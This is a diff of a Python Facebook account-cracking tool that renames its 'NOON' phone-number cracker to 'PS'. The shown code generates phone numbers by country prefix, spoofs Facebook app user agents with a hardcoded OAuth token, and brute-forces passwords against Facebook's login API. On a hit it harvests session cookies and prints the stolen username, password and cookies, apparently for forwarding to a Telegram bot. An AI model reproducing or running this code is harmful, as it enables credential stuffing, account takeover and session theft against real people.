@@ -304,7 +304,7 @@ def _____UpDaTe_S3_____():
     density = random.choice([2.0,2.5,3.0,4.0])
     return f"Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/{fbav};FBBV/{fbbv};FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/{brand};FBBD/{brand};FBDV/{device};FBSV/{android};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"
 
-#----------------<-SECOND TOOL FUNCTIONS (NOON CRACKER)->----------------#
+#----------------<-SECOND TOOL FUNCTIONS (PS CRACKER)->----------------#
 countries_codes = {
     "1": {"name": "Algeria", "codes": ["055", "056", "066", "067", "077", "079"]},
     "2": {"name": "Saudi Arabia", "codes": ["050", "053", "054", "055", "056", "058"]},
@@ -330,10 +330,10 @@ countries_codes = {
     "22": {"name": "Comoros", "codes": ["320", "321", "322", "323", "324", "325"]}
 }
 
-noon_ok = 0
-noon_loop = 0
+PS_ok = 0
+PS_loop = 0
 
-def get_random_ua_noon():
+def get_random_ua_PS():
     android_versions = ["10", "11", "12", "13", "14"]
     devices = [
         "TECNO CK7n",
@@ -361,7 +361,7 @@ def get_random_ua_noon():
     ua = f"""Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/{fbav};FBBV/{fbbv};FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/{brand};FBBD/{brand};FBDV/{device};FBSV/{android};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"""
     return ua
 
-def get_cookies_noon(uid, password):
+def get_cookies_PS(uid, password):
     try:
         temp_headers = {
             "Accept-Encoding": "gzip, deflate",
@@ -372,8 +372,8 @@ def get_cookies_noon(uid, password):
             "x-fb-server-cluster": "True",
             "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
         }
-        temp_headers["User-Agent"] = get_random_ua_noon()
-        data = pm_noon(uid, password)
+        temp_headers["User-Agent"] = get_random_ua_PS()
+        data = pm_PS(uid, password)
         req = requests.post('https://b-graph.facebook.com/auth/login', headers=temp_headers, data=data, timeout=10).json()
         if 'session_key' in req:
             cookies = ";".join([f"{key}={value}" for key, value in req.get('session_cookies', [{}])[0].items()])
@@ -382,7 +382,7 @@ def get_cookies_noon(uid, password):
     except:
         return ""
 
-def pm_noon(email_or_phone, password):
+def pm_PS(email_or_phone, password):
     device_id = str(uuid.uuid4())
     family_device_id = str(uuid.uuid4())
     secure_family_device_id = str(uuid.uuid4())
@@ -461,8 +461,8 @@ def select_code():
         return codes_list[0]
 
 def crackfree(ids, pwxs):
-    global noon_ok, noon_loop
-    sys.stdout.write(f'\r{xp} {R}<[{W}NOON-{noon_loop}{R}]> {R}<[{W}OK-{noon_ok}{R}]>')
+    global PS_ok, PS_loop
+    sys.stdout.write(f'\r{xp} {R}<[{W}PS-{PS_loop}{R}]> {R}<[{W}OK-{PS_ok}{R}]>')
     sys.stdout.flush()
     
     for pw in pwxs:
@@ -476,19 +476,19 @@ def crackfree(ids, pwxs):
                 "x-fb-server-cluster": "True",
                 "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
             }
-            temp_headers["User-Agent"] = get_random_ua_noon()
-            data = pm_noon(ids, pw)
+            temp_headers["User-Agent"] = get_random_ua_PS()
+            data = pm_PS(ids, pw)
             req = requests.post('https://b-graph.facebook.com/auth/login', headers=temp_headers, data=data, timeout=8).json()
             
             if 'session_key' in req:
                 uid = req["uid"]
-                noon_ok += 1
-                coki = get_cookies_noon(ids, pw)
+                PS_ok += 1
+                coki = get_cookies_PS(ids, pw)
                 
-                print(f"\n{xp} {R}<[NOON-OK{R}]> {uid} | {pw}")
+                print(f"\n{xp} {R}<[PS-OK{R}]> {uid} | {pw}")
                 __LINE__()
                 
-                m = f"""✅ OK NOON
+                m = f"""✅ OK PS
 ❖ - USERNAME : {uid}
 ❖ - PASSWORD : {pw}
 ❖ - COOKIES : {coki}
@@ -499,10 +499,10 @@ def crackfree(ids, pwxs):
                 
             elif 'www.facebook.com' in req.get("error", {}).get("message", ""):
                 uid = req["error"]["error_data"]["uid"]
-                print(f"\n{xp} {R}<[NOON-CP{R}]> {uid} | {pw}")
+                print(f"\n{xp} {R}<[PS-CP{R}]> {uid} | {pw}")
                 __LINE__()
                 
-                m = f"""⚠️ CP NOON
+                m = f"""⚠️ CP PS
 PS | @p7s7s سكيور 💔
 USERNAME : {uid}
 PASSWORD : {pw}"""
@@ -512,9 +512,9 @@ PASSWORD : {pw}"""
         except:
             continue
     
-    noon_loop += 1
+    PS_loop += 1
 
-def __NOON_CRACKER__(self):
+def __PS_CRACKER__(self):
     global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
     
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
@@ -524,7 +524,7 @@ def __NOON_CRACKER__(self):
     print(logo)
     
     __LINE__()
-    print(f"{xp} {O}NOON PHONE NUMBER CRACKER")
+    print(f"{xp} {O}PS PHONE NUMBER CRACKER")
     __LINE__()
     
     # Select country and code
@@ -574,7 +574,7 @@ def __NOON_CRACKER__(self):
     
     print('')
     __LINE__()
-    print(f"{xp} NOON Crack Completed")
+    print(f"{xp} PS Crack Completed")
     __LINE__()
     print(f"{xp} THANKS FOR USING.....! ")
     sys.exit()
@@ -598,7 +598,7 @@ class __SEAXNOOR__:
         print(logo)
         __LINE__()
         print(f"{xp1} {O}FILE CLONING ")
-        print(f"{xp2} {O}NOON PHONE CRACKER ")
+        print(f"{xp2} {O}PS PHONE CRACKER ")
         print(f"{xp5} {O}DOWNLOAD PROXY/MODEL FROM GITHUB ")
         print(f"{xp0} {O}EXIT TOOLS ")
         __LINE__()
@@ -606,7 +606,7 @@ class __SEAXNOOR__:
         if __MENUC__ == "1":
             self.__FILEX__()
         elif __MENUC__ == "2":
-            __NOON_CRACKER__(self)
+            __PS_CRACKER__(self)
         elif __MENUC__ == "5":
             self.__DOWNLOAD_FILES__()
         elif __MENUC__ == "0":
